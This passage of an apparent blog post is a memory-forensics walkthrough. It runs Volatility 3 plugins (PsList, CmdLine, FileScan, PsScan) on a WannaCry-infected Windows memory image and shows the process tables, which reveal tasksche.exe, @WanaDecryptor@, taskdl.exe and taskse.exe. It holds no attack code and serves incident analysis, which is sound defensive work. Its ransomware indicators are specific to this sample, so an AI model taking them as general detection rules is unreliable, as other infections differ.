+</span><span class="o">****</span><span class="w"> </span><span class="mi">260</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x81fb95d8</span><span class="w">	</span><span class="nx">5</span><span class="w">	</span><span class="nx">105</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:18.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">****</span><span class="w"> </span><span class="mi">904</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x821b5230</span><span class="w">	</span><span class="nx">9</span><span class="w">	</span><span class="nx">227</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:03.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">****</span><span class="w"> </span><span class="mi">1484</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">spoolsv.exe</span><span class="w">	</span><span class="nx">0x821e2da0</span><span class="w">	</span><span class="nx">14</span><span class="w">	</span><span class="nx">124</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:09.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">****</span><span class="w"> </span><span class="mi">1084</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x8203b7a8</span><span class="w">	</span><span class="nx">6</span><span class="w">	</span><span class="nx">72</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:03.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">***</span><span class="w"> </span><span class="mi">676</span><span class="w">	</span><span class="mi">620</span><span class="w">	</span><span class="n">lsass.exe</span><span class="w">	</span><span class="nx">0x82191658</span><span class="w">	</span><span class="nx">23</span><span class="w">	</span><span class="nx">353</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:01.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">**</span><span class="w"> </span><span class="mi">596</span><span class="w">	</span><span class="mi">348</span><span class="w">	</span><span class="n">csrss.exe</span><span class="w">	</span><span class="nx">0x82161da0</span><span class="w">	</span><span class="nx">12</span><span class="w">	</span><span class="nx">352</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:00.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="mi">1636</span><span class="w">	</span><span class="mi">1608</span><span class="w">	</span><span class="n">explorer.exe</span><span class="w">	</span><span class="nx">0x821d9da0</span><span class="w">	</span><span class="nx">11</span><span class="w">	</span><span class="nx">331</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:10.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">*</span><span class="w"> </span><span class="mi">1956</span><span class="w">	</span><span class="mi">1636</span><span class="w">	</span><span class="n">ctfmon.exe</span><span class="w">	</span><span class="nx">0x82231da0</span><span class="w">	</span><span class="nx">1</span><span class="w">	</span><span class="nx">86</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:14.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">*</span><span class="w"> </span><span class="mi">1940</span><span class="w">	</span><span class="mi">1636</span><span class="w">	</span><span class="n">tasksche.exe</span><span class="w">	</span><span class="nx">0x82218da0</span><span class="w">	</span><span class="nx">7</span><span class="w">	</span><span class="nx">51</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:14.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span><span class="o">**</span><span class="w"> </span><span class="mi">740</span><span class="w">	</span><span class="mi">1940</span><span class="w">	</span><span class="err">@</span><span class="n">WanaDecryptor</span><span class="err">@</span><span class="w">	</span><span class="nx">0x81fde308</span><span class="w">	</span><span class="nx">2</span><span class="w">	</span><span class="nx">70</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:22.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="pslist">PsList</h3>
+
+<p>This plugin is used to list all currently active processes in the machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> wcry.mem windows.pslist.PsList
+</code></pre></div></div>
+
+<p>Results:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PID</span><span class="w">	</span><span class="nx">PPID</span><span class="w">	</span><span class="nx">ImageFileName</span><span class="w">	</span><span class="nx">Offset</span><span class="p">(</span><span class="n">V</span><span class="p">)</span><span class="w">	</span><span class="n">Threads</span><span class="w">	</span><span class="nx">Handles</span><span class="w">	</span><span class="nx">SessionId</span><span class="w">	</span><span class="nx">Wow64</span><span class="w">	</span><span class="nx">CreateTime</span><span class="w">	</span><span class="nx">ExitTime</span><span class="w">	</span><span class="nx">File</span><span class="w"> </span><span class="nx">output</span><span class="w">
+
+</span><span class="mi">4</span><span class="w">	</span><span class="mi">0</span><span class="w">	</span><span class="n">System</span><span class="w">	</span><span class="nx">0x823c8830</span><span class="w">	</span><span class="nx">51</span><span class="w">	</span><span class="nx">244</span><span class="w">	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">348</span><span class="w">	</span><span class="mi">4</span><span class="w">	</span><span class="n">smss.exe</span><span class="w">	</span><span class="nx">0x82169020</span><span class="w">	</span><span class="nx">3</span><span class="w">	</span><span class="nx">19</span><span class="w">	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:21:55.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">596</span><span class="w">	</span><span class="mi">348</span><span class="w">	</span><span class="n">csrss.exe</span><span class="w">	</span><span class="nx">0x82161da0</span><span class="w">	</span><span class="nx">12</span><span class="w">	</span><span class="nx">352</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:00.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">620</span><span class="w">	</span><span class="mi">348</span><span class="w">	</span><span class="n">winlogon.exe</span><span class="w">	</span><span class="nx">0x8216e020</span><span class="w">	</span><span class="nx">23</span><span class="w">	</span><span class="nx">536</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:01.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">664</span><span class="w">	</span><span class="mi">620</span><span class="w">	</span><span class="n">services.exe</span><span class="w">	</span><span class="nx">0x821937f0</span><span class="w">	</span><span class="nx">15</span><span class="w">	</span><span class="nx">265</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:01.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">676</span><span class="w">	</span><span class="mi">620</span><span class="w">	</span><span class="n">lsass.exe</span><span class="w">	</span><span class="nx">0x82191658</span><span class="w">	</span><span class="nx">23</span><span class="w">	</span><span class="nx">353</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:01.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">836</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x8221a2c0</span><span class="w">	</span><span class="nx">19</span><span class="w">	</span><span class="nx">211</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:02.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">904</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x821b5230</span><span class="w">	</span><span class="nx">9</span><span class="w">	</span><span class="nx">227</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:03.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1024</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x821af7e8</span><span class="w">	</span><span class="nx">79</span><span class="w">	</span><span class="nx">1366</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:03.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1084</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x8203b7a8</span><span class="w">	</span><span class="nx">6</span><span class="w">	</span><span class="nx">72</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:03.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1152</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x821bea78</span><span class="w">	</span><span class="nx">10</span><span class="w">	</span><span class="nx">173</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:06.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1484</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">spoolsv.exe</span><span class="w">	</span><span class="nx">0x821e2da0</span><span class="w">	</span><span class="nx">14</span><span class="w">	</span><span class="nx">124</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:09.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1636</span><span class="w">	</span><span class="mi">1608</span><span class="w">	</span><span class="n">explorer.exe</span><span class="w">	</span><span class="nx">0x821d9da0</span><span class="w">	</span><span class="nx">11</span><span class="w">	</span><span class="nx">331</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:10.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1940</span><span class="w">	</span><span class="mi">1636</span><span class="w">	</span><span class="n">tasksche.exe</span><span class="w">	</span><span class="nx">0x82218da0</span><span class="w">	</span><span class="nx">7</span><span class="w">	</span><span class="nx">51</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:14.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1956</span><span class="w">	</span><span class="mi">1636</span><span class="w">	</span><span class="n">ctfmon.exe</span><span class="w">	</span><span class="nx">0x82231da0</span><span class="w">	</span><span class="nx">1</span><span class="w">	</span><span class="nx">86</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:14.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">260</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x81fb95d8</span><span class="w">	</span><span class="nx">5</span><span class="w">	</span><span class="nx">105</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:18.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">740</span><span class="w">	</span><span class="mi">1940</span><span class="w">	</span><span class="err">@</span><span class="n">WanaDecryptor</span><span class="err">@</span><span class="w">	</span><span class="nx">0x81fde308</span><span class="w">	</span><span class="nx">2</span><span class="w">	</span><span class="nx">70</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:22.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1768</span><span class="w">	</span><span class="mi">1024</span><span class="w">	</span><span class="n">wuauclt.exe</span><span class="w">	</span><span class="nx">0x81f747c0</span><span class="w">	</span><span class="nx">7</span><span class="w">	</span><span class="nx">132</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:52.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">544</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">alg.exe</span><span class="w">	</span><span class="nx">0x82010020</span><span class="w">	</span><span class="nx">6</span><span class="w">	</span><span class="nx">101</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:55.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1168</span><span class="w">	</span><span class="mi">1024</span><span class="w">	</span><span class="n">wscntfy.exe</span><span class="w">	</span><span class="nx">0x81fea8a0</span><span class="w">	</span><span class="nx">1</span><span class="w">	</span><span class="nx">37</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:56.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="cmdline">CmdLine</h3>
+
+<p>This plugin is used to list process command line arguments.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> wcry.mem windows.cmdline.CmdLine
+</code></pre></div></div>
+
+<p>Results:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PID</span><span class="w">	</span><span class="nx">Process</span><span class="w">	</span><span class="nx">Args</span><span class="w">
+
+</span><span class="mi">4</span><span class="w">	</span><span class="n">System</span><span class="w">	</span><span class="nx">Required</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">0x10</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="p">(</span><span class="kr">process</span><span class="w"> </span><span class="n">exited</span><span class="nf">?</span><span class="p">)</span><span class="w">
+</span><span class="mi">348</span><span class="w">	</span><span class="n">smss.exe</span><span class="w">	</span><span class="nx">\SystemRoot\System32\smss.exe</span><span class="w">
+</span><span class="mi">596</span><span class="w">	</span><span class="n">csrss.exe</span><span class="w">	</span><span class="nx">C:\WINDOWS\system32\csrss.exe</span><span class="w"> </span><span class="nx">ObjectDirectory</span><span class="o">=</span><span class="n">\Windows</span><span class="w"> </span><span class="nx">SharedSection</span><span class="o">=</span><span class="mi">1024</span><span class="p">,</span><span class="mi">3072</span><span class="p">,</span><span class="mi">512</span><span class="w"> </span><span class="n">Windows</span><span class="o">=</span><span class="n">On</span><span class="w"> </span><span class="nx">SubSystemType</span><span class="o">=</span><span class="n">Windows</span><span class="w"> </span><span class="nx">ServerDll</span><span class="o">=</span><span class="n">basesrv</span><span class="p">,</span><span class="nx">1</span><span class="w"> </span><span class="nx">ServerDll</span><span class="o">=</span><span class="n">winsrv:UserServerDllInitialization</span><span class="p">,</span><span class="nx">3</span><span class="w"> </span><span class="nx">ServerDll</span><span class="o">=</span><span class="n">winsrv:ConServerDllInitialization</span><span class="p">,</span><span class="nx">2</span><span class="w"> </span><span class="nx">ProfileControl</span><span class="o">=</span><span class="n">Off</span><span class="w"> </span><span class="nx">MaxRequestThreads</span><span class="o">=</span><span class="mi">16</span><span class="w">
+</span><span class="mi">620</span><span class="w">	</span><span class="n">winlogon.exe</span><span class="w">	</span><span class="nx">winlogon.exe</span><span class="w">
+</span><span class="mi">664</span><span class="w">	</span><span class="n">services.exe</span><span class="w">	</span><span class="nx">C:\WINDOWS\system32\services.exe</span><span class="w">
+</span><span class="mi">676</span><span class="w">	</span><span class="n">lsass.exe</span><span class="w">	</span><span class="nx">C:\WINDOWS\system32\lsass.exe</span><span class="w">
+</span><span class="mi">836</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">C:\WINDOWS\system32\svchost</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nx">DcomLaunch</span><span class="w">
+</span><span class="mi">904</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">C:\WINDOWS\system32\svchost</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nx">rpcss</span><span class="w">
+</span><span class="mi">1024</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">C:\WINDOWS\System32\svchost.exe</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nx">netsvcs</span><span class="w">
+</span><span class="mi">1084</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">C:\WINDOWS\system32\svchost.exe</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nx">NetworkService</span><span class="w">
+</span><span class="mi">1152</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">C:\WINDOWS\system32\svchost.exe</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nx">LocalService</span><span class="w">
+</span><span class="mi">1484</span><span class="w">	</span><span class="n">spoolsv.exe</span><span class="w">	</span><span class="nx">C:\WINDOWS\system32\spoolsv.exe</span><span class="w">
+</span><span class="mi">1636</span><span class="w">	</span><span class="n">explorer.exe</span><span class="w">	</span><span class="nx">C:\WINDOWS\Explorer.EXE</span><span class="w">
+</span><span class="mi">1940</span><span class="w">	</span><span class="n">tasksche.exe</span><span class="w">	</span><span class="s2">"C:\Intel\ivecuqmanpnirkt615\tasksche.exe"</span><span class="w"> 
+</span><span class="mi">1956</span><span class="w">	</span><span class="n">ctfmon.exe</span><span class="w">	</span><span class="s2">"C:\WINDOWS\system32\ctfmon.exe"</span><span class="w"> 
+</span><span class="mi">260</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">C:\WINDOWS\system32\svchost.exe</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nx">LocalService</span><span class="w">
+</span><span class="mi">740</span><span class="w">	</span><span class="err">@</span><span class="n">WanaDecryptor</span><span class="err">@</span><span class="w">	</span><span class="err">@</span><span class="nx">WanaDecryptor</span><span class="err">@</span><span class="o">.</span><span class="nf">exe</span><span class="w">
+</span><span class="nx">1768</span><span class="w">	</span><span class="nx">wuauclt.exe</span><span class="w">	</span><span class="s2">"C:\WINDOWS\system32\wuauclt.exe"</span><span class="w"> </span><span class="nx">/RunStoreAsComServer</span><span class="w"> </span><span class="nx">Local\</span><span class="p">[</span><span class="mi">400</span><span class="p">]</span><span class="nx">SUSDS81a6658cb72fa845814e75cca9a42bf2</span><span class="w">
+</span><span class="mi">544</span><span class="w">	</span><span class="n">alg.exe</span><span class="w">	</span><span class="nx">C:\WINDOWS\System32\alg.exe</span><span class="w">
+</span><span class="mi">1168</span><span class="w">	</span><span class="n">wscntfy.exe</span><span class="w">	</span><span class="nx">C:\WINDOWS\system32\wscntfy.exe</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="filescan">FileScan</h3>
+
+<p>This plugin scans for file objects in a particular Windows memory image. The results have more than 1,400 lines.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> wcry.mem windows.filescan.FileScan
+</code></pre></div></div>
+
+<h3 id="psscan">PsScan</h3>
+
+<p>This plugin is used to scan for processes present in a particular Windows memory image.</p>
+
+<p>PsList provides a list of running processes, showing details like PID and process name. PsScan, on the other hand, scans for process structures in memory regardless of whether they are currently active, allowing it to find processes that may have been terminated or hidden. This makes PsScan useful for detecting suspicious activity that might not appear in the standard process list.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vol3 <span class="nt">-f</span> wcry.mem windows.psscan.PsScan
+</code></pre></div></div>
+
+<p>Results:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PID</span><span class="w">	</span><span class="nx">PPID</span><span class="w">	</span><span class="nx">ImageFileName</span><span class="w">	</span><span class="nx">Offset</span><span class="p">(</span><span class="n">V</span><span class="p">)</span><span class="w">	</span><span class="n">Threads</span><span class="w">	</span><span class="nx">Handles</span><span class="w">	</span><span class="nx">SessionId</span><span class="w">	</span><span class="nx">Wow64</span><span class="w">	</span><span class="nx">CreateTime</span><span class="w">	</span><span class="nx">ExitTime</span><span class="w">	</span><span class="nx">File</span><span class="w"> </span><span class="nx">output</span><span class="w">
+</span><span class="mi">860</span><span class="w">	</span><span class="mi">1940</span><span class="w">	</span><span class="n">taskdl.exe</span><span class="w">	</span><span class="nx">0x1f4daf0</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="o">-</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:26:23.000000</span><span class="w"> 	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:26:23.000000</span><span class="w"> 	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">536</span><span class="w">	</span><span class="mi">1940</span><span class="w">	</span><span class="n">taskse.exe</span><span class="w">	</span><span class="nx">0x1f53d18</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="o">-</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:26:22.000000</span><span class="w"> 	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:26:23.000000</span><span class="w"> 	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">424</span><span class="w">	</span><span class="mi">1940</span><span class="w">	</span><span class="err">@</span><span class="n">WanaDecryptor</span><span class="err">@</span><span class="w">	</span><span class="nx">0x1f69b50</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="o">-</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:25:52.000000</span><span class="w"> 	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:25:53.000000</span><span class="w"> 	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1768</span><span class="w">	</span><span class="mi">1024</span><span class="w">	</span><span class="n">wuauclt.exe</span><span class="w">	</span><span class="nx">0x1f747c0</span><span class="w">	</span><span class="nx">7</span><span class="w">	</span><span class="nx">132</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:52.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">576</span><span class="w">	</span><span class="mi">1940</span><span class="w">	</span><span class="err">@</span><span class="n">WanaDecryptor</span><span class="err">@</span><span class="w">	</span><span class="nx">0x1f8ba58</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="o">-</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:26:22.000000</span><span class="w"> 	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:26:23.000000</span><span class="w"> 	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">260</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x1fb95d8</span><span class="w">	</span><span class="nx">5</span><span class="w">	</span><span class="nx">105</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:18.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">740</span><span class="w">	</span><span class="mi">1940</span><span class="w">	</span><span class="err">@</span><span class="n">WanaDecryptor</span><span class="err">@</span><span class="w">	</span><span class="nx">0x1fde308</span><span class="w">	</span><span class="nx">2</span><span class="w">	</span><span class="nx">70</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:22.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1168</span><span class="w">	</span><span class="mi">1024</span><span class="w">	</span><span class="n">wscntfy.exe</span><span class="w">	</span><span class="nx">0x1fea8a0</span><span class="w">	</span><span class="nx">1</span><span class="w">	</span><span class="nx">37</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:56.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">544</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">alg.exe</span><span class="w">	</span><span class="nx">0x2010020</span><span class="w">	</span><span class="nx">6</span><span class="w">	</span><span class="nx">101</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:55.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">1084</span><span class="w">	</span><span class="mi">664</span><span class="w">	</span><span class="n">svchost.exe</span><span class="w">	</span><span class="nx">0x203b7a8</span><span class="w">	</span><span class="nx">6</span><span class="w">	</span><span class="nx">72</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:03.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
+</span><span class="mi">596</span><span class="w">	</span><span class="mi">348</span><span class="w">	</span><span class="n">csrss.exe</span><span class="w">	</span><span class="nx">0x2161da0</span><span class="w">	</span><span class="nx">12</span><span class="w">	</span><span class="nx">352</span><span class="w">	</span><span class="nx">0</span><span class="w">	</span><span class="nx">False</span><span class="w">	</span><span class="nx">2017-05-12</span><span class="w"> </span><span class="nx">21:22:00.000000</span><span class="w"> 	</span><span class="nx">N/A</span><span class="w">	</span><span class="nx">Disabled</span><span class="w">
